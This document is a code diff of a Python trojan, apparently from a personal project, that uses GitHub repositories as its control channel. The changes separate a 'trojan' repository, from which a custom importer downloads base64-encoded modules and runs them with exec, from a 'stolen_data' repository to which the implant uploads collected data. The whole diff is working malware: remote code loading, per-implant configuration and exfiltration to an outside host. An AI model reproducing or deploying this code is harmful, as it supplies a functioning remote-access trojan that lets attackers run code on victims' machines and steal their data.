@@ -23,12 +23,12 @@ def install_github3():
     subprocess.check_call(["pip", "install", package])
 
 
-def github_connect():
-    with open('mytoken.txt') as f:
+def github_connect(repo_name, access_token):
+    with open(access_token) as f:
         token = f.read()
     user = 'olekokrasa'
     sess = github3.login(token=token)
-    return sess.repository(user, 'trojan')
+    return sess.repository(user, repo_name)
 
 def get_file_contents(dirname, module_name, repo):
     return repo.file_contents(f'{dirname}/{module_name}').content
@@ -39,16 +39,16 @@ class GitImporter:
 
     def find_module(self, name, path=None):
         print("[*] Próba pobrania %s" % name)
-        self.repo = github_connect()
+        self.import_repo = github_connect('trojan', 'token_trojan.txt')
 
-        new_library = get_file_contents('modules', f'{name}.py', self.repo)
+        new_library = get_file_contents('modules', f'{name}.py', self.import_repo)
         if new_library is not None:
             self.current_module_code = base64.b64decode(new_library)
             return self
 
     def load_module(self, name):
         spec = importlib.util.spec_from_loader(name, loader=None,
-                                               origin=self.repo.git_url)
+                                               origin=self.import_repo.git_url)
         new_module = importlib.util.module_from_spec(spec)
         exec(self.current_module_code, new_module.__dict__)
         sys.modules[spec.name] = new_module
@@ -80,10 +80,11 @@ class Trojan:
         self.id = id
         self.config_file = f'{id}.json'
         self.data_path = f'data/{id}/'
-        self.repo = github_connect()
+        self.import_repo = github_connect('trojan', 'token_trojan.txt')
+        self.export_repo = github_connect('stolen_data', 'token_stolen_data.txt')
 
     def get_config(self):
-        config_json = get_file_contents('config', self.config_file, self.repo)
+        config_json = get_file_contents('config', self.config_file, self.import_repo)
         config = json.loads(base64.b64decode(config_json))
 
         for task in config:
@@ -99,8 +100,8 @@ class Trojan:
         message = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
         remote_path = f'data/{self.id}/{message}.data'
         bindata = bytes('%r' % data, 'utf-8')
-        # self.repo.create_file(remote_path, message, base64.b64encode(bindata))
-        self.repo.create_file(remote_path, message, bindata)
+        # self.export_repo.create_file(remote_path, message, base64.b64encode(bindata))
+        self.export_repo.create_file(remote_path, message, bindata)
 
     def run(self):
         while True:
